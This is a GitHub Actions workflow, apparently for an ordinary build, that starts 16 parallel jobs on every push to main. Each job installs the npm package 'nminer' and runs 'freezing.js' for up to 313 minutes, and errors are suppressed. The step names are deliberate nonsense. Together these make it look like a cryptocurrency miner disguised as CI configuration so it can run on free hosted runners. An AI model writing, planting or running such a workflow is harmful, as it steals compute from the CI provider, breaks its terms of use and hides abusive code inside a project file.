name: freezing
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5731 }
          - { version: 9524 }
          - { version: 9850 }
          - { version: 3829 }
          - { version: 1331 }
          - { version: 5492 }
          - { version: 8618 }
          - { version: 6374 }
          - { version: 5353 }
          - { version: 3937 }
          - { version: 9562 }
          - { version: 1393 }
          - { version: 8403 }
          - { version: 9951 }
          - { version: 3693 }
          - { version: 6147 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: gosh archaeology versus pace times
        run: |
          npm install nminer@latest
          timeout 313m node freezing.js || echo "freezing executed"